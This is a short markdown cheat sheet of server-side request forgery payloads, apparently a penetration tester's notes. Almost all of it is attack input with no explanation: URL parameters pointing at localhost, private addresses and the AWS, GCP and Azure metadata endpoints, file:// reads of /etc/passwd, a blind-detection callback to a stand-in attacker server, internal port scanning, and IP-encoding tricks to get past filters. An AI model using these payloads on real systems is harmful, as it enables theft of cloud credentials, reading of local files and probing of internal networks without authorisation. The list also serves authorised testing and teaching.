# SSRF (Server-Side Request Forgery)

## Basic SSRF

### URL Parameter Testing
```bash
# Localhost
?url=http://localhost/admin
?url=http://127.0.0.1:8080

# Internal services
?url=http://169.254.169.254/  # AWS metadata
?url=http://192.168.1.1/
?url=http://10.0.0.1/

# File protocol
?url=file:///etc/passwd
?url=file:///c:/windows/system32/drivers/etc/hosts
```

## Cloud Metadata

### AWS
```
http://169.254.169.254/latest/meta-data/
http://169.254.169.254/latest/user-data/
```

### GCP
```
http://metadata.google.internal/
http://metadata.google.internal/computeMetadata/v1/
```

### Azure
```
http://169.254.169.254/metadata/
```

## Blind SSRF

### Detection
```bash
# External callback
?url=https://your-server.com/
```

### Time-Based
```bash
# If time delays
?url=http://169.254.169.254/latest/meta-data/&test=delay
```

## Exploitation

### Port Scanning
```bash
?url=http://localhost:22
?url=http://localhost:3306
```

### Read Local Files
```bash
?url=file:///etc/passwd
```

### Internal APIs
```bash
?url=http://internal-api:8080/admin
```

## Payloads

```bash
# URL encoding bypass
%2f%2flocalhost%2fadmin

# Decimal IP
http://2130706433/admin

# Obfuscation
http://127.1/admin
```
